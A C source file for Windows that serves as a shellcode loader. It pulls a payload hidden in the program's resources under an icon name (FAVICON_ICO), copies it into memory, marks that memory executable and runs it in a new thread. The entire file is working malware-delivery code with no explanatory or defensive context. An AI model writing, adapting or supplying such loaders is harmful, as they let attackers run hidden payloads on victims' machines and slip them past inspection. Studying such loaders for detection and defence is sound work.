#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payl;
	unsigned int len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payl = (char *) LockResource(resHandle);
	len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payl, len);
	
	// Set the buffer executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}